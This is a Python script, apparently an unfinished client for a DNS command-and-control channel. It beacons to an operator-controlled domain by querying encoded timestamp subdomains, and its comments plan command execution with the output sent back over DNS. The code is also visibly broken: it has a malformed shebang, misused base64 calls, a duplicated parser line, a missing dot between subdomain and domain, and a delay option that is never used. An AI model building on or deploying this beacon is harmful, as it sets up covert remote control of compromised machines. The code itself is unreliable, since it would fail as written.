#!/usr/bin/env/python3
import dns.resolver
import argparse
import base64
import datetime

# colorize output
OV = '\x1b[0;33m' # verbose
OR = '\x1b[0;34m' # routine
OE = '\x1b[1;31m' # error
OM = '\x1b[0m'    # mischief managed

maxAReq = 253

def decode(b64):
    return base64.decode(str(b64,"UTF"))

def encode(string):
    return base64.encode(bytes(string,"UTF"))

class job:
    def __init__(self, id, domain, command, start):
        self.id = id
        self.domain = domain
        self.command = command
        self.start = datetime.datetime.now()
    # perform command
    # send output back in X batches
    # limit queries to 253 chars - incl domain

def main():
    parser = argparse.ArgumentParser(description='Connect to an Obvious DNS C2 server.')
    parser = argparse.ArgumentParser(description='Connect to an Obvious DNS C2 server.')
    parser.add_argument('domain', help="DNS name to send traffic to. You must have an NS record pointing to the host running the ODC2 Server.")
    parser.add_argument("-v", "--verbose", action="store_true", help="Increase output verbosity")
    parser.add_argument('-d','--delay', default=5, type=int, help='Number of seconds to wait between beacons to C2.')
    parser.add_argument('-t','--timeout', default=3, type=float, help='Timeout in ms to C2.')
    args = parser.parse_args()
    debuggin = args.verbose
    if debuggin:
        print(f"{OV}* Verbose output enabled{OM}")
        print(f"{OV}* Delay between beacons set to {OR}{args.delay}{OM}")
    print(f"{OR}Connecting to {OV}{args.domain}{OM}")
    try:
        res = dns.resolver.Resolver()
        res.timeout = args.timeout
        while True:
            subd = encode(str(datetime.datetime.now()))
            answer = res.query(subd + args.domain)
            # if the answer comes back a certain way, make it a job
    except KeyboardInterrupt:
        pass
    finally:
        pass
    
    # answers = dns.resolver.query('dnspython.org', 'MX')
    # for rdata in answers:
    #     print('Host', rdata.exchange, 'has preference', rdata.preference)

main()